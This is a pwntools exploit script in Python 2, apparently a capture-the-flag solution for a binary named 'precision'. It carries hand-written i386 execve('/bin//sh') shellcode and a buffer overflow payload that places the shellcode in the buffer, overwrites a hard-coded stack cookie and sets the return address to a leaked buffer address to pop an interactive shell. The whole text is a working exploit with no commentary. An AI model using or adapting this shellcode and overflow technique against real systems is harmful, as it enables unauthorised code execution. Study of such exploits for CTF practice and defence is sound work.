from pwn import *

context(os='linux', arch='i386',terminal =['tmux','splitw','-h'])
elf = ELF("./precision")

cookie = '\xa5\x31\x5a\x47\x55\x15\x50\x40'
code = """
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor edx, edx
    push edx /* null terminate */
    push 4
    pop edx
    add edx, esp
    push edx /* 'sh\x00' */
    mov edx, esp
    
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    
    push 0x11 /* 0xb */
    pop eax
    sub eax, 6
    mov ebx, esp
    mov ecx, edx
    cdq /* edx=0 */
    int 0x80
"""
shellcode = asm(code)
r = process("./precision")
addr = r.recv().split("Buff: ")[1]
payload = ''
payload += shellcode# 128
payload += "A" * (128 - len(shellcode))
payload += cookie # 136
payload += "AAAABBBBAAAA" # 140
payload += p32(int(addr,16)) # 144
r.sendline(payload)
print r.recvline()
r.interactive()

